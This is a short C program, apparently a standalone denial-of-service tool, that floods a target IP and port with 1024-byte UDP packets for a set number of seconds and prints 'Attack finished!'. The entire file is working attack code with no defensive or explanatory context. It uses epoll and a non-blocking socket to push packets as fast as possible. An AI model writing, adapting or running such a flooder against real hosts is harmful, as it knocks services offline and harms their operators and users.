#define _GNU_SOURCE #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <arpa/inet.h> #include <fcntl.h> #include <sys/epoll.h> #include <time.h>

#define PACKET_SIZE 1024 #define MAX_EVENTS 1000

struct AttackInfo { char target_ip[16]; int target_port; int duration; };

void udp_flood(struct AttackInfo *info) { struct sockaddr_in target; target.sin_family = AF_INET; target.sin_port = htons(info->target_port); target.sin_addr.s_addr = inet_addr(info->target_ip);

int sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
if (sock < 0) {
    perror("Socket error");
    return;
}

char packet[PACKET_SIZE];
memset(packet, 0xFF, PACKET_SIZE);

int epoll_fd = epoll_create1(0);
struct epoll_event event, events[MAX_EVENTS];
event.events = EPOLLOUT;
event.data.fd = sock;
epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &event);

time_t start_time = time(NULL);
while (time(NULL) - start_time < info->duration) {
    int ready = epoll_wait(epoll_fd, events, MAX_EVENTS, 10);
    for (int i = 0; i < ready; i++) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
    }
}

close(epoll_fd);
close(sock);

}

int main(int argc, char *argv[]) { if (argc != 4) { printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]); return 1; }

struct AttackInfo info;
strncpy(info.target_ip, argv[1], 15);
info.target_ip[15] = '\0';
info.target_port = atoi(argv[2]);
info.duration = atoi(argv[3]);

udp_flood(&info);

printf("Attack finished!\n");
return 0;

}
